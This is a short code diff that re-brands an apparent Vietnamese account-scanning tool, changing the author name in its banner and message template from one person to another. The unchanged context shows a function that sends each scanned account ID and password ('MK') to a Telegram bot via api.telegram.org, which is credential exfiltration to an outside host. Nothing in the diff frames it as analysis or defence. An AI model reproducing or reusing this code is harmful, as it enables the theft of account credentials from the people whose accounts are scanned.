@@ -30,7 +30,7 @@ print("\033[1;33m━━━━━━━━━━━━━━━━━━━━━
 
 def send_to_tele(uid, pw, year, status):
     """Gửi kết quả về Telegram"""
-    message = f"✅  Scan Thành Công!(Chi Thanh)\n━━━━━━━━━━━━\n🆔 ID: {uid}\n🔑 MK: {pw}\n📅 Năm: {year}\n🚦 Trạng thái: {status}\n━━━━━━━━━━━━"
+    message = f"✅  Scan Thành Công!(Hoàng Anh)\n━━━━━━━━━━━━\n🆔 ID: {uid}\n🔑 MK: {pw}\n📅 Năm: {year}\n🚦 Trạng thái: {status}\n━━━━━━━━━━━━"
     url = f"https://api.telegram.org/bot{TELE_TOKEN}/sendMessage"
     params = {"chat_id": ADMIN_ID, "text": message}
     try:
@@ -246,10 +246,10 @@ def ____banner____():
  („• ֊ •„)   LoVE. . . 💌
  ━O━O━━━━━━━━━━━━━━━━━━━━━━━
 [Name]'s Intro! 🐇 💨 
-┊🌺 Name : Yunz
+┊🌺 Name : Hoàng Anh
 ┊
 ============================
-                TOOL BY Nguyen Chi Thanh 
+                TOOL BY Hoàng Anh 
 \033[0m""")
 
 
